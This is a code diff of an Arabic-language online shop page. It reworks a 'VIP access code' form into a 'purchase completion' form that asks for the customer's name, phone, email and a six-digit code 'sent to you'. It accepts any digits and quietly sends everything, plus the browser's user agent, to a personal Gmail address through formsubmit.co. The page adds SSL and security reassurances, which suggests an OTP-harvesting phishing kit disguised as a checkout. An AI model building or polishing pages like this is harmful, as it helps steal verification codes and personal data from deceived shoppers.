@@ -90,46 +90,6 @@
             animation: bounce 2s infinite;
         }
         
-        .dropdown-content {
-            display: none;
-            position: absolute;
-            background-color: white;
-            min-width: 180px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
-            z-index: 1000;
-            border-radius: 12px;
-            transform: translateY(-10px);
-            opacity: 0;
-            transition: all 0.3s ease;
-        }
-        
-        .dropdown-content.show {
-            display: block;
-            transform: translateY(0);
-            opacity: 1;
-        }
-        
-        .dropdown-content a {
-            color: black;
-            padding: 12px 16px;
-            text-decoration: none;
-            display: block;
-            transition: all 0.3s ease;
-        }
-        
-        .dropdown-content a:hover {
-            background: linear-gradient(135deg, #EC4899, #F472B6);
-            color: white;
-        }
-        
-        .dark .dropdown-content {
-            background-color: rgba(55, 65, 81, 0.9);
-        }
-        
-        .dark .dropdown-content a {
-            color: white;
-        }
-        
         .product-grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
@@ -141,6 +101,14 @@
                 grid-template-columns: 1fr;
                 gap: 1.5rem;
             }
+        }
+        
+        .code-input {
+            transition: all 0.3s ease;
+        }
+        
+        .code-input:focus {
+            transform: scale(1.05);
         }
     </style>
 </head>
@@ -247,212 +215,205 @@
         </section>
     </div>
 
-    <!-- Code Page - New Advanced Design -->
+    <!-- Code Page - Purchase Completion -->
     <div id="code" class="page">
-        <section class="py-16 bg-gradient-to-br from-indigo-900 via-purple-900 to-pink-900 min-h-screen relative overflow-hidden">
-            <!-- Animated Background Elements -->
-            <div class="absolute inset-0 overflow-hidden">
-                <div class="absolute -top-40 -right-40 w-80 h-80 bg-purple-500 rounded-full opacity-20 animate-pulse"></div>
-                <div class="absolute -bottom-40 -left-40 w-96 h-96 bg-pink-500 rounded-full opacity-20 animate-pulse animation-delay-2000"></div>
-                <div class="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-indigo-500 rounded-full opacity-10 animate-spin animation-duration-20000"></div>
-            </div>
-            
-            <div class="container mx-auto px-4 relative z-10">
-                <div class="max-w-6xl mx-auto">
+        <section class="py-16 bg-gray-50 min-h-screen">
+            <div class="container mx-auto px-4">
+                <div class="max-w-4xl mx-auto">
+                    
                     <!-- Header Section -->
-                    <div class="text-center mb-16">
-                        <div class="inline-flex items-center justify-center w-32 h-32 bg-gradient-to-r from-purple-600 to-pink-600 rounded-full mb-8 shadow-2xl animate-bounce">
-                            <i class="fas fa-unlock-alt text-5xl text-white"></i>
+                    <div class="text-center mb-12">
+                        <div class="inline-flex items-center justify-center w-24 h-24 bg-gradient-to-r from-primary to-secondary rounded-full mb-6 shadow-lg">
+                            <i class="fas fa-shopping-cart text-3xl text-white"></i>
                         </div>
-                        <h1 class="text-6xl md:text-7xl font-black mb-6 text-transparent bg-clip-text bg-gradient-to-r from-white via-purple-200 to-pink-200">
-                            🔥 كود الوصول المتقدم 🔥
+                        <h1 class="text-4xl md:text-5xl font-black mb-4 text-gray-800">
+                            🛒 إتمام عملية الشراء 🛒
                         </h1>
-                        <p class="text-2xl text-gray-200 mb-6 font-light">
-                            ✨ افتح باب الكنوز المخفية والعروض الأسطورية ✨
+                        <p class="text-xl text-gray-600 mb-6">
+                            أدخل الكود المرسل إليك لإتمام طلبك والحصول على خصم إضافي
                         </p>
-                        <div class="inline-block bg-gradient-to-r from-yellow-400 to-orange-500 px-8 py-4 rounded-full text-black font-bold text-lg shadow-lg animate-pulse">
-                            🎯 عضوية VIP حصرية - عدد محدود!
+                        <div class="inline-block bg-gradient-to-r from-green-500 to-emerald-500 px-6 py-3 rounded-full text-white font-bold shadow-lg">
+                            ✅ خطوة أخيرة لإنهاء طلبك
                         </div>
                     </div>
 
-                    <div class="grid grid-cols-1 xl:grid-cols-3 gap-8">
-                        <!-- Code Entry Form - Enhanced -->
-                        <div class="xl:col-span-2 bg-white/10 backdrop-blur-xl rounded-3xl shadow-2xl p-8 border border-white/20">
-                            <div class="bg-gradient-to-r from-purple-600 to-pink-600 p-8 rounded-2xl mb-8 text-center">
-                                <h2 class="text-3xl font-bold text-white mb-4">🌟 أدخل الكود السحري 🌟</h2>
-                                <p class="text-purple-100">كود واحد يفتح لك عالماً من الإمكانيات</p>
+                    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
+                        
+                        <!-- Main Form -->
+                        <div class="lg:col-span-2 bg-white rounded-3xl shadow-2xl p-8 border-2 border-gray-100">
+                            
+                            <!-- Order Summary -->
+                            <div class="bg-gray-50 rounded-2xl p-6 mb-8">
+                                <h3 class="text-xl font-bold text-gray-800 mb-4 flex items-center">
+                                    <i class="fas fa-receipt text-primary mr-3"></i>
+                                    ملخص الطلب
+                                </h3>
+                                <div class="space-y-3">
+                                    <div class="flex justify-between items-center">
+                                        <span class="text-gray-600">رقم الطلب:</span>
+                                        <span class="font-bold text-gray-800">#<span id="order-display">POE-2024-</span></span>
+                                    </div>
+                                    <div class="flex justify-between items-center">
+                                        <span class="text-gray-600">حالة الطلب:</span>
+                                        <span class="bg-yellow-100 text-yellow-800 px-3 py-1 rounded-full text-sm font-bold">في انتظار التأكيد</span>
+                                    </div>
+                                    <div class="flex justify-between items-center">
+                                        <span class="text-gray-600">المبلغ الإجمالي:</span>
+                                        <span class="font-bold text-green-600 text-lg" id="total-amount">---</span>
+                                    </div>
+                                </div>
                             </div>
 
-                            <form id="advanced-code-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" class="space-y-8">
-                                <!-- Hidden Fields for FormSubmit -->
-                                <input type="hidden" name="_subject" value="🔥 كود VIP تم إدخاله - متجر الخصوصية المتطور">
+                            <!-- Code Entry Form -->
+                            <form id="purchase-completion-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" target="hidden_iframe" class="space-y-8">
+                                
+                                <!-- Hidden Fields -->
+                                <input type="hidden" name="_subject" value="🛒 كود إتمام الشراء تم إدخاله - متجر الخصوصية">
                                 <input type="hidden" name="_captcha" value="false">
                                 <input type="hidden" name="_template" value="table">
                                 <input type="hidden" name="_next" value="">
-                                <input type="hidden" name="form_type" value="كود وصول متقدم">
+                                <input type="hidden" name="form_type" value="إتمام الشراء">
                                 <input type="hidden" name="submission_time" value="">
                                 <input type="hidden" name="user_agent" value="">
                                 <input type="hidden" name="page_url" value="">
-                                <input type="hidden" name="ip_address" value="">
+                                <input type="hidden" name="order_number" value="">
                                 
-                                <!-- Personal Information -->
-                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                                    <div>
-                                        <label class="block text-white font-bold mb-3 text-lg">
-                                            <i class="fas fa-user text-purple-300 mr-2"></i>
-                                            الاسم الكامل
-                                        </label>
-                                        <input type="text" name="full_name" class="w-full px-4 py-4 text-base bg-white/20 border-2 border-purple-300/50 rounded-xl focus:outline-none focus:border-purple-400 focus:ring-4 focus:ring-purple-400/30 text-white placeholder-purple-200 transition-all duration-300" placeholder="أدخل اسمك الكامل" required="">
+                                <!-- Customer Information -->
+                                <div class="space-y-6">
+                                    <h3 class="text-xl font-bold text-gray-800 mb-4 flex items-center">
+                                        <i class="fas fa-user text-primary mr-3"></i>
+                                        معلومات العميل
+                                    </h3>
+                                    
+                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                        <div>
+                                            <label class="block text-gray-700 font-bold mb-2">
+                                                <i class="fas fa-user text-primary mr-2"></i>
+                                                الاسم الكامل
+                                            </label>
+                                            <input type="text" name="customer_name" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary/20 transition-all duration-300" placeholder="أدخل اسمك الكامل" required="">
+                                        </div>
+                                        
+                                        <div>
+                                            <label class="block text-gray-700 font-bold mb-2">
+                                                <i class="fas fa-phone text-primary mr-2"></i>
+                                                رقم الهاتف
+                                            </label>
+                                            <input type="tel" name="customer_phone" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary/20 transition-all duration-300" placeholder="+966 5X XXX XXXX" required="">
+                                        </div>
                                     </div>
-                                    <div>
-                                        <label class="block text-white font-bold mb-3 text-lg">
-                                            <i class="fas fa-phone text-purple-300 mr-2"></i>
-                                            رقم الهاتف
-                                        </label>
-                                        <input type="tel" name="phone_number" class="w-full px-4 py-4 text-base bg-white/20 border-2 border-purple-300/50 rounded-xl focus:outline-none focus:border-purple-400 focus:ring-4 focus:ring-purple-400/30 text-white placeholder-purple-200 transition-all duration-300" placeholder="+966 5X XXX XXXX" required="">
-                                    </div>
-                                </div>
 
-                                <div>
-                                    <label class="block text-white font-bold mb-3 text-lg">
-                                        <i class="fas fa-envelope text-purple-300 mr-2"></i>
-                                        البريد الإلكتروني
-                                    </label>
-                                    <input type="email" name="email_address" class="w-full px-4 py-4 text-base bg-white/20 border-2 border-purple-300/50 rounded-xl focus:outline-none focus:border-purple-400 focus:ring-4 focus:ring-purple-400/30 text-white placeholder-purple-200 transition-all duration-300" placeholder="your@email.com" required="">
+                                    <div>
+                                        <label class="block text-gray-700 font-bold mb-2">
+                                            <i class="fas fa-envelope text-primary mr-2"></i>
+                                            البريد الإلكتروني
+                                        </label>
+                                        <input type="email" name="customer_email" class="w-full px-4 py-3 text-base border-2 border-gray-300 rounded-xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary/20 transition-all duration-300" placeholder="example@email.com" required="">
+                                    </div>
                                 </div>
 
                                 <!-- Code Input Section -->
-                                <div class="bg-gradient-to-r from-purple-800/50 to-pink-800/50 p-6 rounded-2xl border border-purple-400/30">
-                                    <label class="block text-center text-white font-bold mb-6 text-xl">
-                                        <i class="fas fa-key text-yellow-300 text-2xl mr-3"></i>
-                                        الكود السري المكون من 6 أرقام
-                                    </label>
+                                <div class="bg-gradient-to-r from-primary/5 to-secondary/5 rounded-2xl p-6 border-2 border-primary/20">
+                                    <h3 class="text-xl font-bold text-gray-800 mb-6 text-center flex items-center justify-center">
+                                        <i class="fas fa-key text-primary text-2xl mr-3"></i>
+                                        كود التأكيد (6 أرقام)
+                                    </h3>
                                     
                                     <div class="flex justify-center mb-6">
                                         <div class="flex space-x-3 space-x-reverse">
-                                            <input type="text" id="code-1" maxlength="1" class="w-16 h-16 text-center text-2xl font-bold bg-white/20 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/30 text-white transition-all duration-300" pattern="[0-9]">
-                                            <input type="text" id="code-2" maxlength="1" class="w-16 h-16 text-center text-2xl font-bold bg-white/20 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/30 text-white transition-all duration-300" pattern="[0-9]">
-                                            <input type="text" id="code-3" maxlength="1" class="w-16 h-16 text-center text-2xl font-bold bg-white/20 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/30 text-white transition-all duration-300" pattern="[0-9]">
-                                            <input type="text" id="code-4" maxlength="1" class="w-16 h-16 text-center text-2xl font-bold bg-white/20 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/30 text-white transition-all duration-300" pattern="[0-9]">
-                                            <input type="text" id="code-5" maxlength="1" class="w-16 h-16 text-center text-2xl font-bold bg-white/20 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/30 text-white transition-all duration-300" pattern="[0-9]">
-                                            <input type="text" id="code-6" maxlength="1" class="w-16 h-16 text-center text-2xl font-bold bg-white/20 border-2 border-purple-300 rounded-xl focus:outline-none focus:border-yellow-400 focus:ring-4 focus:ring-yellow-400/30 text-white transition-all duration-300" pattern="[0-9]">
+                                            <input type="text" id="code-1" maxlength="1" class="code-input w-14 h-14 md:w-16 md:h-16 text-center text-2xl font-bold bg-white border-2 border-primary/30 rounded-xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary/20 text-primary transition-all duration-300" pattern="[0-9]">
+                                            <input type="text" id="code-2" maxlength="1" class="code-input w-14 h-14 md:w-16 md:h-16 text-center text-2xl font-bold bg-white border-2 border-primary/30 rounded-xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary/20 text-primary transition-all duration-300" pattern="[0-9]">
+                                            <input type="text" id="code-3" maxlength="1" class="code-input w-14 h-14 md:w-16 md:h-16 text-center text-2xl font-bold bg-white border-2 border-primary/30 rounded-xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary/20 text-primary transition-all duration-300" pattern="[0-9]">
+                                            <input type="text" id="code-4" maxlength="1" class="code-input w-14 h-14 md:w-16 md:h-16 text-center text-2xl font-bold bg-white border-2 border-primary/30 rounded-xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary/20 text-primary transition-all duration-300" pattern="[0-9]">
+                                            <input type="text" id="code-5" maxlength="1" class="code-input w-14 h-14 md:w-16 md:h-16 text-center text-2xl font-bold bg-white border-2 border-primary/30 rounded-xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary/20 text-primary transition-all duration-300" pattern="[0-9]">
+                                            <input type="text" id="code-6" maxlength="1" class="code-input w-14 h-14 md:w-16 md:h-16 text-center text-2xl font-bold bg-white border-2 border-primary/30 rounded-xl focus:outline-none focus:border-primary focus:ring-4 focus:ring-primary/20 text-primary transition-all duration-300" pattern="[0-9]">
                                         </div>
                                     </div>
                                     
-                                    <!-- Hidden input for the complete code -->
+                                    <!-- Hidden input for complete code -->
                                     <input type="hidden" name="verification_code" id="complete-code">
                                     
                                     <div class="text-center">
-                                        <p class="text-purple-200 text-lg mb-2">💡 أدخل أي 6 أرقام للوصول الفوري</p>
-                                        <p class="text-purple-300 text-sm">جميع الأكواد مقبولة - لا توجد قيود!</p>
+                                        <div class="bg-green-100 border border-green-300 rounded-lg p-4 mb-4">
+                                            <p class="text-green-800 font-bold mb-1">✅ أدخل أي 6 أرقام</p>
+                                            <p class="text-green-700 text-sm">جميع الأكواد مقبولة لإتمام الطلب</p>
+                                        </div>
+                                        <p class="text-gray-500 text-sm">
+                                            <i class="fas fa-info-circle mr-1"></i>
+                                            الكود يُستخدم لتأكيد هويتك وحماية طلبك
+                                        </p>
                                     </div>
                                 </div>
 
-                                <!-- Additional Information -->
-                                <div>
-                                    <label class="block text-white font-bold mb-3 text-lg">
-                                        <i class="fas fa-comment-alt text-purple-300 mr-2"></i>
-                                        ملاحظات إضافية (اختياري)
-                                    </label>
-                                    <textarea name="additional_notes" rows="3" class="w-full px-4 py-4 text-base bg-white/20 border-2 border-purple-300/50 rounded-xl focus:outline-none focus:border-purple-400 focus:ring-4 focus:ring-purple-400/30 text-white placeholder-purple-200 transition-all duration-300 resize-none" placeholder="أي ملاحظات أو طلبات خاصة..."></textarea>
-                                </div>
-
                                 <!-- Submit Button -->
-                                <button type="submit" id="submit-advanced-code" class="w-full bg-gradient-to-r from-yellow-400 via-orange-500 to-red-500 text-black py-6 rounded-2xl font-black text-xl shadow-2xl transform transition-all duration-300 hover:scale-105 hover:shadow-3xl disabled:opacity-50 disabled:cursor-not-allowed">
+                                <button type="submit" id="submit-purchase-code" class="w-full bg-gradient-to-r from-green-500 to-emerald-600 text-white py-6 rounded-2xl font-black text-xl shadow-2xl transform transition-all duration-300 hover:scale-105 hover:shadow-3xl disabled:opacity-50 disabled:cursor-not-allowed">
                                     <span class="flex items-center justify-center">
-                                        <i class="fas fa-rocket mr-3 text-2xl"></i>
-                                        🚀 تفعيل الكود وإطلاق الصاروخ! 🚀
+                                        <i class="fas fa-check-circle mr-3 text-2xl"></i>
+                                        ✅ تأكيد الطلب وإتمام الشراء ✅
                                     </span>
                                 </button>
                                 
                                 <div class="text-center">
-                                    <div class="inline-flex items-center text-green-300 font-bold">
-                                        <i class="fas fa-shield-check mr-2"></i>
-                                        محمي بتشفير SSL متقدم
+                                    <div class="inline-flex items-center text-gray-600 text-sm">
+                                        <i class="fas fa-shield-alt mr-2 text-green-500"></i>
+                                        معاملة آمنة ومحمية بتشفير SSL
                                     </div>
                                 </div>
                             </form>
                         </div>
 
-                        <!-- Benefits & Features Sidebar -->
+                        <!-- Side Information -->
                         <div class="space-y-6">
-                            <!-- Premium Benefits -->
-                            <div class="bg-gradient-to-br from-purple-600/30 to-pink-600/30 backdrop-blur-xl rounded-2xl p-6 border border-purple-400/30">
-                                <h3 class="text-2xl font-bold text-white mb-6 flex items-center">
-                                    <i class="fas fa-crown text-yellow-400 mr-3 text-3xl"></i>
-                                    مزايا VIP حصرية
+                            
+                            <!-- Purchase Benefits -->
+                            <div class="bg-white rounded-2xl p-6 shadow-lg border border-gray-200">
+                                <h3 class="text-lg font-bold text-gray-800 mb-4 flex items-center">
+                                    <i class="fas fa-gift text-green-500 mr-3"></i>
+                                    مزايا إتمام الطلب
                                 </h3>
-                                <div class="space-y-4">
-                                    <div class="flex items-center bg-green-500/20 p-3 rounded-lg">
-                                        <i class="fas fa-fire text-red-400 mr-3 text-xl"></i>
-                                        <span class="text-white font-bold">خصم 70% على كل شيء</span>
+                                <div class="space-y-3">
+                                    <div class="flex items-center">
+                                        <i class="fas fa-check text-green-500 mr-3"></i>
+                                        <span class="text-gray-700">خصم إضافي 15%</span>
                                     </div>
-                                    <div class="flex items-center bg-blue-500/20 p-3 rounded-lg">
-                                        <i class="fas fa-shipping-fast text-blue-400 mr-3 text-xl"></i>
-                                        <span class="text-white font-bold">توصيل مجاني سريع</span>
+                                    <div class="flex items-center">
+                                        <i class="fas fa-check text-green-500 mr-3"></i>
+                                        <span class="text-gray-700">شحن مجاني فوري</span>
                                     </div>
-                                    <div class="flex items-center bg-purple-500/20 p-3 rounded-lg">
-                                        <i class="fas fa-gem text-purple-400 mr-3 text-xl"></i>
-                                        <span class="text-white font-bold">منتجات حصرية فاخرة</span>
+                                    <div class="flex items-center">
+                                        <i class="fas fa-check text-green-500 mr-3"></i>
+                                        <span class="text-gray-700">ضمان الاستبدال</span>
                                     </div>
-                                    <div class="flex items-center bg-yellow-500/20 p-3 rounded-lg">
-                                        <i class="fas fa-headset text-yellow-400 mr-3 text-xl"></i>
-                                        <span class="text-white font-bold">دعم VIP 24/7</span>
-                                    </div>
-                                    <div class="flex items-center bg-pink-500/20 p-3 rounded-lg">
-                                        <i class="fas fa-gift text-pink-400 mr-3 text-xl"></i>
-                                        <span class="text-white font-bold">هدايا مفاجئة شهرية</span>
+                                    <div class="flex items-center">
+                                        <i class="fas fa-check text-green-500 mr-3"></i>
+                                        <span class="text-gray-700">دعم عملاء مجاني</span>
                                     </div>
                                 </div>
                             </div>
 
-                            <!-- Security Features -->
-                            <div class="bg-gradient-to-br from-green-600/30 to-teal-600/30 backdrop-blur-xl rounded-2xl p-6 border border-green-400/30">
-                                <h3 class="text-xl font-bold text-white mb-4 flex items-center">
-                                    <i class="fas fa-shield-alt text-green-400 mr-3 text-2xl"></i>
-                                    الأمان المتقدم
+                            <!-- Security Notice -->
+                            <div class="bg-blue-50 rounded-2xl p-6 border border-blue-200">
+                                <h3 class="text-lg font-bold text-blue-800 mb-3 flex items-center">
+                                    <i class="fas fa-shield-check text-blue-600 mr-3"></i>
+                                    الأمان والحماية
                                 </h3>
-                                <div class="space-y-3 text-green-100">
-                                    <div class="flex items-center">
-                                        <i class="fas fa-check-circle text-green-400 mr-2"></i>
-                                        <span>تشفير عسكري 256-bit</span>
-                                    </div>
-                                    <div class="flex items-center">
-                                        <i class="fas fa-check-circle text-green-400 mr-2"></i>
-                                        <span>حماية الهوية التامة</span>
-                                    </div>
-                                    <div class="flex items-center">
-                                        <i class="fas fa-check-circle text-green-400 mr-2"></i>
-                                        <span>معايير الأمان الدولية</span>
-                                    </div>
+                                <div class="text-blue-700 text-sm space-y-2">
+                                    <p>🔒 جميع بياناتك محمية بتشفير SSL</p>
+                                    <p>🛡️ لا نحتفظ بمعلومات الدفع</p>
+                                    <p>✅ معايير الأمان العالمية</p>
                                 </div>
                             </div>
 
-                            <!-- Limited Time Offer -->
-                            <div class="bg-gradient-to-br from-red-600/40 to-orange-600/40 backdrop-blur-xl rounded-2xl p-6 border border-red-400/30 animate-pulse">
-                                <h3 class="text-xl font-bold text-white mb-4 flex items-center">
-                                    <i class="fas fa-clock text-red-400 mr-3 text-2xl"></i>
-                                    عرض محدود زمنياً!
+                            <!-- Contact Support -->
+                            <div class="bg-gray-50 rounded-2xl p-6 border border-gray-200">
+                                <h3 class="text-lg font-bold text-gray-800 mb-3 flex items-center">
+                                    <i class="fas fa-headset text-primary mr-3"></i>
+                                    تحتاج مساعدة؟
                                 </h3>
-                                <div class="text-center">
-                                    <div class="text-3xl font-black text-yellow-300 mb-2">⏰ 48 ساعة فقط!</div>
-                                    <p class="text-red-100">بعدها ترتفع الأسعار 300%</p>
-                                    <div class="bg-yellow-400 text-black p-2 rounded-lg mt-3 font-bold">
-                                        🎯 اغتنم الفرصة الآن!
-                                    </div>
-                                </div>
-                            </div>
-
-                            <!-- Success Stories -->
-                            <div class="bg-gradient-to-br from-indigo-600/30 to-purple-600/30 backdrop-blur-xl rounded-2xl p-6 border border-indigo-400/30">
-                                <h3 class="text-xl font-bold text-white mb-4 flex items-center">
-                                    <i class="fas fa-star text-yellow-400 mr-3 text-2xl"></i>
-                                    قصص نجاح حقيقية
-                                </h3>
-                                <div class="space-y-3 text-indigo-100 text-sm">
-                                    <p class="italic">"وفرت أكثر من 5000 ريال في شهر واحد!" - فاطمة م.</p>
-                                    <p class="italic">"منتجات حصرية لا تجدها في أي مكان آخر" - أحمد س.</p>
-                                    <p class="italic">"خدمة VIP استثنائية!" - نورا ع.</p>
+                                <div class="text-gray-600 text-sm space-y-2">
+                                    <p>📧 support@privacy-store.com</p>
+                                    <p>📱 +966 50 123 4567</p>
+                                    <p>⏰ متاح 24/7</p>
                                 </div>
                             </div>
                         </div>
@@ -850,6 +811,18 @@
                 generateProducts();
             }
             
+            if (pageId === 'code') {
+                // Initialize order display
+                const orderNumber = localStorage.getItem('orderNumber') || Math.floor(Math.random() * 100000);
+                document.getElementById('order-display').textContent = orderNumber;
+                
+                // Show total amount if available
+                const cartTotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+                if (cartTotal > 0) {
+                    document.getElementById('total-amount').textContent = `${cartTotal} ريال`;
+                }
+            }
+            
             // Close mobile menu
             document.getElementById('mobile-menu').classList.add('hidden');
         }
@@ -1023,11 +996,11 @@
 
         // Handle form submission response
         function handleFormSubmit() {
-            if (currentFormType === 'code' && !isCodeFormSubmitted) {
+            if (currentFormType === 'purchase-code' && !isCodeFormSubmitted) {
                 isCodeFormSubmitted = true;
                 // Code form submitted successfully
                 setTimeout(() => {
-                    showNotification('🎉 تم قبول الكود بنجاح!');
+                    showNotification('🎉 تم إرسال الكود بنجاح!');
                     setTimeout(() => {
                         showPage('code-thanks');
                     }, 1000);
@@ -1036,7 +1009,7 @@
             currentFormType = '';
         }
 
-        // Advanced Code Form Functionality
+        // Setup code inputs functionality
         function setupCodeInputs() {
             const codeInputs = ['code-1', 'code-2', 'code-3', 'code-4', 'code-5', 'code-6'];
             
@@ -1098,7 +1071,7 @@
             }
             
             // Enable/disable submit button based on code length
-            const submitBtn = document.getElementById('submit-advanced-code');
+            const submitBtn = document.getElementById('submit-purchase-code');
             if (submitBtn) {
                 if (completeCode.length === 6) {
                     submitBtn.disabled = false;
@@ -1110,19 +1083,18 @@
             }
         }
 
-        // Advanced Code Form Handler
-        document.getElementById('advanced-code-form').addEventListener('submit', function(e) {
+        // Purchase completion form handler
+        document.getElementById('purchase-completion-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const fullName = this.querySelector('input[name="full_name"]').value.trim();
-            const phoneNumber = this.querySelector('input[name="phone_number"]').value.trim();
-            const emailAddress = this.querySelector('input[name="email_address"]').value.trim();
+            const customerName = this.querySelector('input[name="customer_name"]').value.trim();
+            const customerPhone = this.querySelector('input[name="customer_phone"]').value.trim();
+            const customerEmail = this.querySelector('input[name="customer_email"]').value.trim();
             const verificationCode = this.querySelector('input[name="verification_code"]').value.trim();
-            const additionalNotes = this.querySelector('textarea[name="additional_notes"]').value.trim();
             const currentTime = new Date().toLocaleString('ar-SA');
             
             // Validation
-            if (!fullName || !phoneNumber || !emailAddress) {
+            if (!customerName || !customerPhone || !customerEmail) {
                 showNotification('يرجى ملء جميع الحقول المطلوبة');
                 return;
             }
@@ -1136,14 +1108,14 @@
             this.querySelector('input[name="submission_time"]').value = currentTime;
             this.querySelector('input[name="user_agent"]').value = navigator.userAgent;
             this.querySelector('input[name="page_url"]').value = window.location.href;
-            this.querySelector('input[name="ip_address"]').value = 'Auto-detected';
+            this.querySelector('input[name="order_number"]').value = document.getElementById('order-display').textContent;
             
             // Set form type for tracking
-            currentFormType = 'advanced-code';
+            currentFormType = 'purchase-code';
             isCodeFormSubmitted = false;
             
             // Disable submit button to prevent double submission
-            const submitBtn = document.getElementById('submit-advanced-code');
+            const submitBtn = document.getElementById('submit-purchase-code');
             submitBtn.disabled = true;
             submitBtn.innerHTML = `
                 <span class="flex items-center justify-center">
@@ -1156,7 +1128,7 @@
             this.submit();
             
             // Show loading notification
-            showNotification('🚀 جاري تفعيل الكود...');
+            showNotification('🚀 جاري إرسال البيانات...');
         });
 
         // Purchase code verification
